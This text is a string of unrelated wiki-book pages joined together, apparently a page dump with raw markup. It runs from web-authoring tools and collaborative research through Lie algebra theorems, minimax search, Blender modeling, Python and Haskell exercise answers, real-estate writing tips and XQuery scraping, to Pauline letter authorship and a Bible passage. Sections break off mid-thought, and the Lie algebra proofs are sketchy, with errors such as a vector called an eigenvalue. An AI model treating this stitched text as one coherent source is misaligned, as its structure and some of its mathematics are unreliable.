This chapter defines web authoring and gives tips for making web pages available to all users. In addition, several popular web authoring tools are named and described. This chapter also discusses collaborative research and the positive effects of using it in the classroom.

===Key Concepts===



'''Web Authoring'''


Web authoring is a category of software the enables the author to develop a website, and also the ability to design and create a web site by writing the site’s code and text (Webopedia). According to Horton, when it comes to creating a website, there are three ways to do so. First, an author can write their own code and create their own content using the HTML format by hand. With this method, an HTML text editor is used to simplify web page creation. Using this software still requires the author to work in text mode, but it is more workable. A second way is to use web page design software where the author just adds the content to the page as opposed to putting in all of the code necessary. With this method, the author never has to see the code and it works just like you would type a word processing document. The final method is to use a courseware system that combines tools to deliver online instruction. This method is if you are designing an online class or are instructing someone. Web authoring connects to constructivism because students can create their own websites. It is a great way for them to show what they have learned. An example is after having learned and completed an assignment on the moon, the students can create a website discussing the phases, and the other details that they learned about. 



'''Considering the Users'''

As the author designs the page, it is important to consider all users. Since people use computers in many ways, it is imperative that the author follows guidelines so that the viewers can see, manage and navigate the site that the author is creating. This affects the colors chosen, the size of font, and the fact that some people may use older and slower technology. In addition, pages should be simple and use valid HTML elements as well (University of Edinburgh).



'''Web Authoring Tools'''

The Centre for Learning and Performance Technologies lists the following programs that were voted top tools for learning by learning professionals world wide. Dreamweaver is a web development tool that designs, develops, and maintains websites and applications. Firebug edits and debugs CSS, HTML, and JavaScript live in any web page. Flash is an advanced authoring platform designed to create interactive websites and other digital experiences. Google Page Creator is a free source that creates and publishes web pages. Notepad++ is a free source code editor that supports a variety of programming languages using Windows. Nvu is also a free authoring platform that works for not only Windows, but also Mac and Linux. 



'''Collaborative Research'''

The University of Oregon has developed a Collaborative Research Model. This model is designed for students to work together toward a decision on a common problem or goal. In the model there are five principles: Focusing on Learning Outcomes, Developing Communication, Posing the Problem, Generating Multiple Perspectives, and Making Informed Decisions.

In focusing on learning outcomes, the learner needs to be actively engaged in the process. Authentic tasks should be given, and those tasks should be measurable and provide students with an opportunity for increased learning, the ability to retain knowledge longer, and increased performance on future projects. The second principle, developing communications, requires the learner to have an open mind and attempt to understand others’ points of view. In posing the problem, the learner is also actively engaged in their search of a question for research. The fourth principle involves the learner to generate multiple perspectives. The learner should engage others by restating information, by being empathetic towards the speaker, and by thinking critically. The final principle to collaborative research is decision making. During decision making, the learners are determining claims and counterclaims, creating shared definitions, sharing their perspectives, and evaluating results.

Collaborative research is designed to develop strong learning experiences for students, and has benefits for both the teacher and the learner. It connects to constructivism because it is the essence of what constructivism is. The students guide the learning and are actively engaged in the process. The teacher is the facilitator as the students work to communicate with one another and make informed decisions.

===Examples===
Web Authoring can be applied to the classroom. Students can design and create their own websites. After having researched a topic, a way to present that information could be on a website. Depending on the age, some students in high school could deal with the code aspect of a website. In elementary school, students could use their teacher’s website and a template to share what they have learned. 



Collaborative research can also be applied in the classroom in many ways. One example would be for students to create and research a service learning project. Upper elementary, middle, and high school students could research a country or culture. Within that, they could find out what serious needs are for that area, and then design a fundraiser or drive to help support that particular country. Knowledge is extended, and it covers several subject areas.

      <text xml:space="preserve">Let &lt;math&gt;V&lt;/math&gt; be a vector space. &lt;math&gt;(V, [, ])&lt;/math&gt; is called a Lie algebra if it is equipped with the bilinear operator &lt;math&gt;V \times V \to V&lt;/math&gt;, denoted by &lt;math&gt;[, ]&lt;/math&gt;, subject to the properties: for every &lt;math&gt;x, y, z \in V&lt;/math&gt;
*(i) [x, x] = 0
*(ii) [x, [y, z]] + [y, [z, x]] + [z, [x, y]] = 0
(ii) is called the Jacobi identity.

Example: For &lt;math&gt;x, y \in \mathbf{R}^3&lt;/math&gt;, define &lt;math&gt;[x, y] = x \times y&lt;/math&gt;, the cross product of &lt;math&gt;x&lt;/math&gt; and &lt;math&gt;y&lt;/math&gt;. The known properties of the cross products show that &lt;math&gt;(R^3, [,])&lt;/math&gt; is a Lie algebra.

Example: Let &lt;math&gt;\operatorname{Der}(V) = \{ D \in \operatorname{Ext}(V) : D(x y) = (Dx) y + x Dy \}&lt;/math&gt;. A member of &lt;math&gt;\operatorname{Der}(V)&lt;/math&gt; is called a derivation. Define &lt;math&gt;[x, y] = xy - yx&lt;/math&gt;. Then &lt;math&gt;[x, y] \in \operatorname{Der}(V)&lt;/math&gt;.

'''Theorem''' ''Let &lt;math&gt;V&lt;/math&gt; be a finite-dimensional vector space.
*''(i) If &lt;math&gt;\mathfrak{g} \subset \mathfrak{gl}_k(V)&lt;/math&gt; is a Lie algebra consisting of nilpotent elements, then there exists &lt;math&gt;v \in V&lt;/math&gt; such that &lt;math&gt;x(v) = 0&lt;/math&gt; for every &lt;math&gt;x \in \mathfrak{g}&lt;/math&gt;.''
*''(ii) If &lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable, then there exists a common eigenvalue &lt;math&gt;v \in V&lt;/math&gt;.''

'''Theorem (Engel)''' ''&lt;math&gt;\mathfrak{g}&lt;/math&gt; is nilpotent if and only if &lt;math&gt;\operatorname{ad}(x)&lt;/math&gt; is nilpotent for every &lt;math&gt;x \in \mathfrak{g}&lt;/math&gt;.''&lt;br /&gt;
Proof: The direct part is clear. For the converse, note that  from the preceding theorem that &lt;math&gt;\operatorname{ad}(\mathfrak{g})&lt;/math&gt; is a subalgebra of &lt;math&gt;\mathfrak{n}_k&lt;/math&gt;. Thus, &lt;math&gt;\operatorname{ad}(\mathfrak{g})&lt;/math&gt; is nilpotent and so is &lt;math&gt;\mathfrak{g}&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt;

'''Theorem''' ''&lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable if and only if &lt;math&gt;[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is nilpotent.''&lt;br /&gt;
Proof: Suppose &lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable. Then &lt;math&gt;\operatorname{ad}[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is a subalgebra of &lt;math&gt;\mathfrak{b}_k&lt;/math&gt;. Thus, &lt;math&gt;\operatorname{ad}[\mathfrak{g}, \mathfrak{g}] \subset \mathfrak{n}_k&lt;/math&gt;. Hence, &lt;math&gt;\operatorname{ad}[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is nilpotent, and so &lt;math&gt;[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; is nilpotent. For the converse, note the exact sequence:
:&lt;math&gt;0 \longrightarrow [\mathfrak{g}, \mathfrak{g}] \longrightarrow \mathfrak{g} \longrightarrow \mathfrak{g} / {[\mathfrak{g}, \mathfrak{g}]} \longrightarrow 0&lt;/math&gt;
Since both &lt;math&gt;[\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; and &lt;math&gt;\mathfrak{g} / [\mathfrak{g}, \mathfrak{g}]&lt;/math&gt; are solvable, &lt;math&gt;\mathfrak{g}&lt;/math&gt; is solvable. &lt;math&gt;\square&lt;/math&gt;

'''3 Therorem (Weyl's theorem)''' ''Every representation of a finite-dimensional semisimple Lie algebra:
:&lt;math&gt;\mathfrak g \to \operatorname{End}(V)&lt;/math&gt;
''is completely reducible.''&lt;br /&gt;
Proof: It suffices to prove that every &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule has a &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule complement. Furthermore, the proof reduces to the case when &lt;math&gt;W&lt;/math&gt; is simple (as a module) and has codimension one. Indeed, given a &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule &lt;math&gt;W&lt;/math&gt;, let &lt;math&gt;E \subset \operatorname{Hom}(V, W)&lt;/math&gt; be the subspace consisting of elements &lt;math&gt;f&lt;/math&gt; such that &lt;math&gt;f|_W&lt;/math&gt; is a scalar multiplication. Since any commutator of elements &lt;math&gt;f \in E&lt;/math&gt; is zero (that is, multiplication by zero), it is clear that &lt;math&gt;E / [E, E]&lt;/math&gt; has dimension 1. &lt;math&gt;E&lt;/math&gt; may not be simple, but by induction on the dimension of &lt;math&gt;E&lt;/math&gt;, we can assume that. Hence, &lt;math&gt;E&lt;/math&gt; has complement of dimension 1, which is spanned by, say, &lt;math&gt;f&lt;/math&gt;. It follows that &lt;math&gt;V&lt;/math&gt; is the direct sum of &lt;math&gt;W&lt;/math&gt; and the kernel of &lt;math&gt;f&lt;/math&gt;. Now, to complete the proof, let &lt;math&gt;W&lt;/math&gt; be a simple &lt;math&gt;\mathfrak g&lt;/math&gt;-submodule of codimension 1. Let &lt;math&gt;c&lt;/math&gt; be a Casimir element of &lt;math&gt;\mathfrak g \to \operatorname{End}(V)&lt;/math&gt;. It follows that &lt;math&gt;V&lt;/math&gt; is the direct sum of &lt;math&gt;W&lt;/math&gt; and the kernel of &lt;math&gt;c&lt;/math&gt;. &lt;math&gt;\square&lt;/math&gt; (TODO: obviously, the proof is very sketchy; we need more details.)

      <text xml:space="preserve">The minimax search is especially known for its usefulness in calculating the best move in two player games where all the information is available, such as chess or tic tac toe (Muller, 2001). It consists of navigating through a tree which captures all the possible moves in the game, where each move is represented in terms of loss and gain for one of the players. It follows that this can only be used to make decisions in zero-sum games, where one player’s loss is the other player’s gain. Theoretically, this search algorithm is based von Neumann’s minimax theorem which states that in these types of games there is always a set of strategies which leads to both players gaining the same value and that seeing as this is the best possible value one can expect to gain, one should employ this set of strategies (Kulenovic, 2008).

== Description ==

The first step is to give each node a value in terms of utility for player 1. These values are derived from the values of the terminal nodes, which each represent an end of the game. Each level of the tree alternates between player 1’s move, who is trying to maximize her score, and player 2’s move, who is trying to minimize player 1's score in order to undermine her success. If the level above the terminal nodes represents player 2’s possible moves, then the value of the nodes will be the lowest value among those of their children, the minimum. On the other hand, if this level represents the possible moves for player 1, the value of its nodes will be the highest value among those of their children. Finally, once all the nodes have been assigned values, it is decision time for player 1 who just picks the move which will lead to the highest value (Russell &amp; Norvig, 1995). Figure 1 illustrates this process.

== Pseudocode  ==
This pseudocode is adapted from a version presented by Russell and Norvig (1995).
&lt;pre&gt;
function minimaxDecision (game)
	for each possible move in game
		moveValue = minimaxValue(state, game)

	return move with highest value

function minimaxValue (state, game)
	if terminal node
		return utility

	if player 1's turn
		return highest value of children

	if player 2's turn
		return lowest value of children
&lt;/pre&gt;

== Complications, Shortcomings and Future Directions ==
One shortcoming of this search is that it assumes that the opponent will act in such a way that he will effectively minimize your gains and maximize his own. However, this will not hold if your opponent is irrational, a beginner or a human who can be mistaken. In some cases, it may be best to gamble and hope that your opponent will not notice a subtle countermove (Moore &amp; Knuth, 1975). 

Moreover, representing all the possible moves for simple games like tic tac toe is not so difficult but with games like chess, it becomes computationally expensive to represent them all. Therefore, programmers often rely on further algorithms to narrow the search, such as alpha-beta pruning (Moore &amp; Knuth, 1975). This consists of the stopping the calculation of the utility of one node when it is determined that there is no way its value could be higher than that of an adjacent node. For an alternative method called min/max approximation, see Rivest (1988).

Another way of cutting down the search space is to only go to a certain depth, treat the moves at that level as makeshift terminal nodes and determine their values using heuristics. Still, this is problematic in cases where long term planning is necessary (Sadikov &amp; Bratko, 2006). However, this approach can be made more viable by looking for stable stages within a game and using these as intermediate terminal nodes (Scheucher &amp; Kaindl, 1989). Despite these techniques, there is a debate as to whether using a minimax search is actually effective in such complex cases (Sadikov et al., 2005).

Finally, this section only discusses games in which the next state is solely determined by the moves of the players involved. The final frontier of the minimax search are games which involve chance, such as backgammon and poker (Hauk et al., 2006).

[[Image:Blenderceramics.jpg|left|A collection of objects modeled with the spin tool]]

The Spin tool is a great tool for modeling objects you might make on a lathe quickly and easily.

Lathe objects have circular cross sections along a certain axis. That is to say, when you cut such objects perpendicular to a certain axis you'll get circles. Examples of such objects includes rods, poles, wineglasses, and pails. A Blender render at the left shows some of these.

With the Spin tool you only have to &quot;model&quot; half the outline of your object. The object is completed after you spin this outline. A bit of cleanup here and there and your model is finished.

== Chapter 1 ==
See below for Chapter 1 exercises.

=== Exercise 1.4 ===
If you run a 10 kilometer race in 43 minutes 30 seconds, what is your average time per mile? What is your average speed in miles per hour? (Hint: there are 1.61 kilometers in a mile).

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; 10/1.61 # Convert kilometers to miles
6.2111801242236018
&gt;&gt;&gt; (43*60)+30 # Convert time to seconds
2610
&gt;&gt;&gt; 2610/6.2111801242236018 # what is your average time (seconds) per mile
420.21000000000004
&gt;&gt;&gt; 420.21000000000004/60 # what is your average time (minutes) per mile
7.0035000000000007
&gt;&gt;&gt; 60/7.0035000000000007 # Miles per hour
8.5671449989291055
&lt;/PRE&gt;

Comment:
This is not valid, it '''ONLY''' works for 43min and 30 seconds to 10km's.
Python should have a way to do this the proper way.&lt;br /&gt;&lt;br /&gt;
In order to do this the proper way, a person must do something like this.&lt;br /&gt;
43*60 -&gt; convert the minutes to seconds.&lt;br /&gt;
2580+30 -&gt; add the seconds&lt;br /&gt;
2610/10 -&gt; divide by distance&lt;br /&gt;
261/60 -&gt; change seconds into minutes&lt;br /&gt;
4.35 -&gt; is the answer, now you must&lt;br /&gt;
.35*60 -&gt; multiply the number after the decimal with 60&lt;br /&gt;
21 seconds..&lt;br /&gt;
End result = 4.21 minutes per KM, this technique works for all distances and times.

== Chapter 2 ==

=== Exercise 2.1 ===
If you type an integer with a leading zero, you might get a confusing error:

&lt;PRE CLASS=&quot;verbatim&quot;&gt;&amp;gt;&amp;gt;&amp;gt; zipcode = 02492
                  ^
SyntaxError: invalid token
&lt;/PRE&gt;
Other number seem to work, but the results are bizarre:
&lt;PRE CLASS=&quot;verbatim&quot;&gt;&amp;gt;&amp;gt;&amp;gt; zipcode = 02132
&amp;gt;&amp;gt;&amp;gt; print zipcode
1114
&lt;/PRE&gt;

&lt;/DIV&gt;
So python is assuming you want to convert an octal number to a decimal number. In the base 8 numbering system where valid numbers are '''0, 1, 2, 3, 4, 5, 6 and 7'''.
&lt;PRE CLASS=&quot;verbatim&quot;&gt;
Base  8: 00 01 02 03 04 05 06 07 10 11 12 13 14 15 16 17 20 21 22 23 24
Base 10: 00 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16 17 18 19 20
&lt;/PRE&gt;
Every 8 numbers we increment the left hand columns. This means that the right most column is the number of 'ones'. The one to the left of that is a tally of the number of 'eights', the one next to that is a tally of a full column of 'eight' times the 'eight column' - 64. The one next to that is 64*8 - 512 and so on.
For more information read [[http://www4.ncsu.edu/unity/lockers/users/f/felder/public/kenny/papers/bases.html Base Eight math]]. 

That is why '''zipcode = 02492''' is invalid as the digit 9 is not a valid octal number. We can do the conversion manually as follows:

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; print 02132
1114
&gt;&gt;&gt; (2*512)+(1*64)+(3*8)+(2*1)
1114
&gt;&gt;&gt; 
&lt;/PRE&gt;

=== Exercise 2.4 ===

The volume of a sphere with radius '''r''' is ''4/3'' &amp;#X3C0; ''r''&lt;SUP&gt;''3''&lt;/SUP&gt;''.
What is the volume of a sphere with radius 5? 

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; pi = 3.1415926535897931
&gt;&gt;&gt; r = 5
&gt;&gt;&gt; 4/3*pi*r**3 # This is the wrong answer
392.69908169872411
&gt;&gt;&gt; r = 5.0 # Radius can be a float here as well, but is not _necessary_.
&gt;&gt;&gt; 4.0/3.0*pi*r**3 # Using floats give the correct answer
523.59877559829886
&gt;&gt;&gt; 
&lt;/PRE&gt;

Suppose the cover price of a book is $24.95, but bookstores get a 40% discount. Shipping costs $3 for the first copy and 75 cents for each additional copy. What is the total wholesale cost for 60 copies?''

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
 $24.95  Cost
  $9.98  Discount per book
 $14.97  Cost per book after discount
  60     Total number of books
$898.20  Total cost not inc delivery

  $3.00  First book delivery
  59     Remaining books
  $0.75  Delivery cost for extra books
 $44.25  Total cost for extra books
 $47.25  Total Delivery cost
	
$945.45	 Total Bill

This answer is wrong because 40.0/100.0 return wrong value 0.40000000000000002 for more info see IEEE 754 (Standard for Floating-Point Arithmetic)
&gt;&gt;&gt; (24.95-24.95*40.0/100.0)*60+3+0.75*(60-1)
945.44999999999993
&gt;&gt;&gt; 24.95*0.6*60+0.75*(60-1)+3
945.45
&lt;/PRE&gt;

If I leave my house at 6:52 am and run 1 mile at an easy pace (8:15 per mile), then 3 miles at tempo (7:12 per mile) and 1 mile at easy pace again, what time do I get home for breakfast?

Answer: '''7:30 am'''

How I did it:
&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; start = (6*60+52)*60
&gt;&gt;&gt; easy = (8*60+15)*2
&gt;&gt;&gt; fast = (7*60+12)*3
&gt;&gt;&gt; finish_hour = (start + easy + fast)/(60*60.0)
&gt;&gt;&gt; finish_floored = (start + easy + fast)/(60*60)  #int() function can also be used to get integer value, but isn't taught yet.
&gt;&gt;&gt; finish_minute  = (finish_hour - finish_floored)*60
&gt;&gt;&gt; print 'Finish time was %d:%d' % (finish_hour,finish_minute)
Finish time was 7:30

*** ANOTHER WAY ***
start_time_hr = 6 + 52 / 60.0
easy_pace_hr = (8 + 15 / 60.0 ) / 60.0
tempo_pace_hr = (7 + 12 / 60.0) / 60.0
running_time_hr = 2 * easy_pace_hr + 3 * tempo_pace_hr
breakfast_hr = start_time_hr + running_time_hr
breakfast_min = (breakfast_hr-int(breakfast_hr))*60
breakfast_sec= (breakfast_min-int(breakfast_min))*60

print ('breakfast_hr', int(breakfast_hr) )
print ('breakfast_min', int (breakfast_min) )
print ('breakfast_sec', int (breakfast_sec) )
&gt;&gt;&gt; 
&lt;/PRE&gt;

== Chapter 3 ==

=== Exercise 3.3 ===
Python provides a built-in function called ''len'' that returns the length of a string, so the value of len('allen') is 5. Write a function named right_justify that takes a string named ''s'' as a parameter and prints the string with enough leading spaces so that the last letter of the string is in column 70 of the display.

&lt;PRE CLASS=&quot;verbatim&quot;&gt;
&gt;&gt;&gt; def right_justify(s):
...     print (' '*(70-len(s))+s)
... 
&gt;&gt;&gt; right_justify('allen')
                                                                 allen

comment = &quot;&quot;&quot;
After writing a draft of the 4x4 grid, I noticed that many of the
functions had the same structure: they would do something, do
something else four times, and then do something else once.

So I wrote one_four_one, which takes three functions as arguments; it
calls the first one once, then uses do_four to call the second one
four times, then calls the third.

Then I rewrote print1beam, print1post, print4beams, print4posts,
print_row and print_grid using one_four_one.

Programming is an exploratory process.  Writing a draft of a program
often gives you insight into the problem, which might lead you to
rewrite the code to reflect the structure of the solution.

3. Download http://thinkpython.com/code/color_list.py and use the function ''read_colors'' to generate a list of the available colors on your system, their names and RGB values. For each named color draw a sphere in the position that corresponds to its RGB values.

&lt;source lang=&quot;python&quot;&gt;
# As there currently (2013-04-12) is no function read_colors in color_list.py
# I use a workaround and simply import the variable COLORS from color_list.py.
# I then use the function all_colors() on COLORS to get a list of the colors.

from color_list import COLORS
from visual import scene, sphere

def all_colors(colors_string=COLORS):
    &quot;&quot;&quot;Extract a list of unique RGB-tuples from COLORS.
    The tuples look like (r, g, b), where r, g and b are each integers in
    [0, 255].
    &quot;&quot;&quot;

    # split the string into lines and remove irrelevant lines
    lines = colors_string.split('\n')[2:-2]  

    # split the individual lines and remove the names
    numbers_only = [line.split()[:3] for line in lines]
    
    # turn strings into ints and rgb-lists into tuples
    rgb_tuples = [tuple([int(s) for s in lst]) for lst in numbers_only]

    # return a list of unique tuples
    return list(set(rgb_tuples))

def make_spheres(color_tuples=all_colors()):
    scene.range = (256, 256, 256)
    scene.center = (128, 128, 128)
    for (r, g, b) in color_tuples:
        sphere(pos=(r, g, b), radius=7, color=(r/255., g/255., b/255.))

Write a function called ''bisection'' that takes a sorted list and a target value and returns the index of the value in the list, if it’s there, or ''None'' if it’s not.

      <text xml:space="preserve">{{YAHT contents}}
&lt;!-- = Errata = --&gt;

This page contains a list of errata which have been discovered so far in the [http://darcs.haskell.org/yaht/yaht.pdf PDF version] of YAHT (some of these may have already been corrected in the [[Haskell/YAHT|online HTML version]] - (imported)).

*  There is a bug in the solution to Exercise 7.1 on page 79, under &quot;7.3  Partial Application&quot; (see [[Haskell/YAHT/Language advanced#Partial Application|Advanced Language: Partial Application]] for the corresponding HTML version (which has already been corrected)), for which the exercise is stated as follows:


{{Exercises|1=
Convert the following functions into point-free style, if possible.

&lt;pre&gt;
[...]

func5 f l = foldr (\x y -&gt; f (y,x)) 0 l
&lt;/pre&gt;}}

* On page 81, text states

&quot;we create a value, call it x, which has value Red. We
then apply this to colorToRGB. We check to see if we can “match” x against Red.
This match fails because according to the definition of Eq Color, Red is not equal
to Yellow.&quot;

Clearly, the premise is wrong, the initial value x should be 'Yellow' in order for the rest of the paragraph to make sense.


* According to the page 172 of the [http://darcs.haskell.org/yaht/yaht.pdf PDF file], the solution is stated as follows:

&lt;pre&gt;
[...]

func5 = foldr (uncurry $ flip f) 0
&lt;/pre&gt;

However, as [http://article.gmane.org/gmane.comp.lang.haskell.beginners/1349 pointed out] by Michael Mossey on the Haskell-Beginners mailing list, that solution is actually incorrect.

Here is the correct solution:

&lt;pre&gt;
[...]

func5 = flip foldr 0 . flip . curry 
&lt;/pre&gt;

As a sidenote, Daniel Fischer has [http://article.gmane.org/gmane.comp.lang.haskell.beginners/1350 provided] a succinct way of verifying correctness of the solutions, using types, as follows:

----
A simple way to check for sanity of the results is:

{{HaskellExample|1=|2=&lt;pre&gt;
Prelude&gt; :t flip foldr 0 . flip. curry
flip foldr 0 . flip. curry :: (Num c) =&gt; ((c, b) -&gt; c) -&gt; [b] -&gt; c

Prelude&gt; :t \f list -&gt; foldr (\x y -&gt; f (y,x)) 0 list
\f list -&gt; foldr (\x y -&gt; f (y,x)) 0 list :: (Num b) =&gt;
                                             ((b, a) -&gt; b) -&gt; [a] -&gt; b

Prelude&gt; :t \f -&gt; foldr (uncurry $ flip f) 0
\f -&gt; foldr (uncurry $ flip f) 0 :: (Num b1) =&gt;
                                    (b -&gt; a -&gt; b1 -&gt; b1) -&gt; [(a, b)] -&gt; b1
&lt;/pre&gt;}}

So you see that your result has the correct type, while Hal's hasn't.
----
In the above-mentioned description, the first pair of two lines show that the type of 

&lt;pre&gt;
flip foldr 0 . flip. curry
&lt;/pre&gt;

(i.e., the solution to verify) is 

&lt;pre&gt;
(Num c) =&gt; ((c, b) -&gt; c) -&gt; [b] -&gt; c
&lt;/pre&gt;

The second pair of two lines show that the type of 

&lt;pre&gt;
\f list -&gt; foldr (\x y -&gt; f (y,x)) 0 list
&lt;/pre&gt;

(i.e., essentially the expression given in the exercise, which was &lt;code&gt;f l = foldr (\x y -&gt; f (y,x)) 0 l&lt;/code&gt;) is also 

&lt;pre&gt;
(Num b) =&gt; ((b, a) -&gt; b) -&gt; [a] -&gt; b
&lt;/pre&gt;

(Note that this is the same type as above, only written with renamed variables.)

The third pair of two lines show that the type of 
&lt;pre&gt;
\f -&gt; foldr (uncurry $ flip f) 0
&lt;/pre&gt;

(i.e., the solution given by Hal in the [http://darcs.haskell.org/yaht/yaht.pdf PDF version] of the tutorial) is 

&lt;pre&gt;
(Num b1) =&gt; (b -&gt; a -&gt; b1 -&gt; b1) -&gt; [(a, b)] -&gt; b1
&lt;/pre&gt;

which is a different type.  Hence, the solution given by Hal is incorrect.

{{warning|1=
YAHT has never been comprehensively proofread, so this is only a partial list.
}}

{{warning|1=
This is still a work in progress.  Feel free to add to it as needed!
}}

2. Exercise 4.11:
{{Exercises|1=
4.11. Test whether the CPS-style fold mimicks either of foldr and foldl. If not, where is the difference?
}}
It does not specify the &quot;CPS-style fold&quot; function, so the reader should assume that the exercise is about the previously defined cfold:
&lt;pre&gt;
cfold’ f z [] = z
cfold’ f z (x:xs) = f x z (\y -&gt; cfold’ f y xs)
cfold f z l = cfold’ (\x t g -&gt; f x (g t)) z l
&lt;/pre&gt;
But the solution given in YAHT is actually not about about this function. In fact, this function behaves exactly as foldr. The solution is about very similar function: the only difference is in the order of arguments for the second case of cfold', namely
&lt;pre&gt;
cfold' f z (x:xs) = f z x (\y -&gt; cfold' f y xs)
&lt;/pre&gt;</text>

      <text xml:space="preserve">Writing Tips for Real Estate Agents

10 years ago, writing wasn’t a necessary task for any agent. In 2009, there’s hardly an agent getting started in real estate that hasn’t heard of a blog, ezinearticles, or digg and the many benefits associated with publishing information online. If you’re already a successful agent, writing will only make you better.

The agent controlling the best and most information in their market wins. Writing doesn’t just help your website rank better, it keeps you informed and connected. Would it make sense for you to write about the same thing over-and-over? By writing, you become an expert in many things, and overtime, people will notice.

If you don’t have time to write, find time, or partner up with someone that can. A new breed of agents that grew up online definitely will. Here are a few tips to help you get the ball rolling…

Enjoy your writing and just get started…

Don’t make your next article or blog post a job. Writing a couple hundred words each day about issues that interest you will help get you into the groove. Write daily about things you take pleasure in, and I can guarantee that all aspects of your writing and communication skills will improve.  Just get started…your career may depend on it.

Practice Makes Perfect

Not all agents are good at writing but every agent can improve their writing with practice. For me, writing is a passion, which continues to get stronger each day. However, without writing every day I could not have written three books, hundreds of articles and hundreds of blog posts. A calendar helps me stay motivated with my writing. One huge calendar and a red marker is all I need to stay consistent and motivated. I draw a big red X each day I write. At the end of each week, I look at the calendar and if I have a row of red Xs, I know I just created content that can bring me leads for months and years.

Use an Outline

When I write, having an outline is essential because it helps me put my ideas in order and “on paper”. This helps me focus on writing, instead of wasting time on another round or two of research. There’s no “set” standard for an outline, just jot down your main topics, and a couple initial thoughts for each (link if needed) and use the outline to stay on topic.

Writing isn’t always fun, but if you get started and write about issues you enjoy, a little practice and an outline may make it more bearable. The Internet changed the real estate game forever and the new breed of agents is going to reach consumers by providing them with information they’re looking for, online, while they’re looking for it.

      <text xml:space="preserve">== Motivation ==
You want a toolkit for pulling information out of web pages, even if those pages are not well formed XML files.

== Method ==
XQuery is an ideal toolkit for manipulating well-formed HTML; you need only use the doc() function, e.g. &lt;nowiki&gt;doc('http://www.example.org/index.html')&lt;/nowiki&gt; or doc('/db/path/to/index.html').  But, if a webpage is not well-formed XML, you will get errors about the source not being well-formed.

Luckily, there are programs that transform HTML files into well-formed XML files.  

eXist provides several such tools.  One is the httpclient module's get function, '''httpclient:get()'''.  To use this function you need to enable the httpclient module, by modifying the conf.xml file so that the module is loaded the next time you start eXist.  Uncomment the following line:

&lt;source lang=&quot;xml&quot;&gt;
   &lt;module class=&quot;org.exist.xquery.modules.httpclient.HTTPClientModule&quot;
      uri=&quot;http://exist-db.org/xquery/httpclient&quot; /&gt;
&lt;/source&gt;

For example the following example performs an '''HTTP GET''' on the list of all the feeds from the IBM web site:
&lt;source lang=&quot;xml&quot;&gt;
let $feeds-url := 'http://www.ibm.com/ibm/syndication/us/en/?cm_re=footer-_-ibmfeeds-_-top_level'
let $data := httpclient:get(xs:anyURI($feeds-url), true(), &lt;Headers/&gt;)
return $data
&lt;/source&gt;

Sometimes the HTML is so malformed that even httpclient:get() will not be able to salvage the HTML.  For example, if an element has two @id elements, you will get the error, &quot;Error XQDY0025: element has more than one attribute 'id'&quot;.  In this case, you may need to download the HTML source and clean up the HTML just enough so that eXist can parse the rest.  Then, store the file in your database, and use the '''util:parse-html()''' function (which passes the text through the Neko HTML parser to make it well-formed).

The following XQuery will clean up HTML (saved as text file, because it is still malformed):
&lt;source lang=&quot;xml&quot;&gt;
let $html-txt := util:binary-to-string(util:binary-doc('/db/html-file-saved-as-text.txt'))
let $data := util:parse-html($html-txt)
return $data
&lt;/source&gt;

== Testing your HTTP Client with an Simple Echo Script ==

Once you have the have the results in 

Source code for echo.xq
&lt;source lang=&quot;xml&quot;&gt;
xquery version &quot;1.0&quot;;
declare namespace httpclient=&quot;http://exist-db.org/xquery/httpclient&quot;;
let $feeds-url := 'http://www.ibm.com/ibm/syndication/us/en/?cm_re=footer-_-ibmfeeds-_-top_level'
let $http-get-data := httpclient:get(xs:anyURI($feeds-url), true(), &lt;Headers/&gt;)
return
&lt;echo-results&gt;
   {$http-get-data}
&lt;/echo-results&gt;
&lt;/source&gt;

      <text xml:space="preserve">== Basic Facts in Need of Elaboration ==

Most scholars believe Paul's letters were the first NT documents produced. They are the earliest surviving Christian literature. His earliest letter dates from ca. A.D. 50. It was probably what we call 1 Thessalonians, although some scholar consider Galatians the earliest. The latest letter written by Paul is probably earlier than the earliest other NT writing.

Thirteen of the twenty-seven NT books bear Paul's name: Romans; 1 and 2 Corinthians; Galatians; Ephesians; Philippians; Colossians; 1 and 2 Thessalonians; 1 and 2 Timothy; Titus; and Philemon. The strict Pauline authorship of nine letters traditionally assigned to Paul is challenged in contemporary scholarship:

  Authentic:  Romans; 1 &amp; 2 Corinthians; Galatians; Philippians; 1 Thessalonians; Philemon
  Debated:    2 Thessalonians; Colossians; Ephesians
  Doubted:    1 &amp; 2 Timothy; Titus
  Denied:     Hebrews

'''Complications with Authorship:'''

'''Food Sacrificed To Idols'''
&lt;sup&gt;1&lt;/sup&gt;Now about food sacrificed to idols: We know that we all possess knowledge.[a] Knowledge puffs up, but love builds up. &lt;sup&gt;2&lt;/sup&gt;The man who thinks he knows something does not yet know as he ought to know. &lt;sup&gt;3&lt;/sup&gt;But the man who loves God is known by God. 

&lt;sup&gt;4&lt;/sup&gt;So then, about eating food sacrificed to idols: We know that an idol is nothing at all in the world and that there is no God but one. &lt;sup&gt;5&lt;/sup&gt;For even if there are so-called gods, whether in heaven or on earth (as indeed there are many &quot;gods&quot; and many &quot;lords&quot;), &lt;sup&gt;6&lt;/sup&gt;yet for us there is but one God, the Father, from whom all things came and for whom we live; and there is but one Lord, Jesus Christ, through whom all things came and through whom we live. 

&lt;sup&gt;7&lt;/sup&gt;But not everyone knows this. Some people are still so accustomed to idols that when they eat such food they think of it as having been sacrificed to an idol, and since their conscience is weak, it is defiled. &lt;sup&gt;8&lt;/sup&gt;But food does not bring us near to God; we are no worse if we do not eat, and no better if we do. 

